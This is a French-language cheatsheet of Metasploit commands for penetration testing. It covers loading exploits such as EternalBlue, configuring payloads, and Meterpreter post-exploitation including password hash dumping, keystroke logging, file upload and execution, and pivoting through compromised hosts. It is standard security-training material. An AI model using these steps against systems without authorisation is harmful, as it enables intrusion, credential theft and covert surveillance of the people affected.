# ⚡ Metasploit Framework - Cheatsheet Cyber Sécurité

Ce fichier regroupe les **commandes essentielles** et **étapes clés** pour utiliser **Metasploit Framework** dans un contexte de tests d’intrusion, notamment pour exploitation, post-exploitation, et pivot.

---

## 1️⃣ Lancement de Metasploit

msfconsole  
> Démarre l’interface interactive de Metasploit.

---

## 2️⃣ Recherche de modules

search nom_du_module  
> Recherche un module d’exploit, scanner, payload, etc.

---

## 3️⃣ Chargement d’un module

use module/chemin/vers_module  
> Sélectionne un module à utiliser (exemple : use exploit/windows/smb/ms17_010_eternalblue).

---

## 4️⃣ Configuration des options

show options  
> Affiche les paramètres configurables du module.

set OPTION valeur  
> Configure une option, par exemple : set RHOSTS 192.168.1.10

set PAYLOAD payload/chemin  
> Définit le payload à utiliser.

---

## 5️⃣ Lancement de l’attaque

exploit  
> Lance l’exploit avec les paramètres configurés.

run  
> Exécute le module (équivalent à exploit).

---

## 6️⃣ Post-exploitation

sessions  
> Liste les sessions ouvertes (accès aux shells).

sessions -i ID  
> Interagit avec une session spécifique.

---

## 7️⃣ Commandes utiles dans une session Meterpreter

sysinfo  
> Affiche des infos sur la machine compromise.

getuid  
> Montre l’utilisateur courant.

upload chemin_local chemin_distant  
> Upload un fichier.

download chemin_distant chemin_local  
> Télécharge un fichier.

execute -f fichier.exe  
> Exécute un fichier sur la cible.

shell  
> Ouvre un shell système.

hashdump  
> Dump les hashes de mot de passe (nécessite privilèges).

keyscan_start  
> Commence à enregistrer les frappes clavier.

keyscan_dump  
> Affiche les frappes clavier capturées.

keyscan_stop  
> Arrête la capture.

---

## 8️⃣ Pivot et tunneling

route add [réseau cible] [masque] [session]  
> Permet de router le trafic via une session compromise.

portfwd add -l [local_port] -p [port_cible] -r [ip_cible]  
> Redirige un port local vers un port distant à travers la session.

---

## 📌 Ressources utiles

- Documentation officielle : https://docs.metasploit.com  
- Modules Metasploit : https://www.rapid7.com/db/modules/  
- Tutoriels : https://www.offensive-security.com/metasploit-unleashed/  
- Payloads : https://github.com/rapid7/metasploit-payloads  
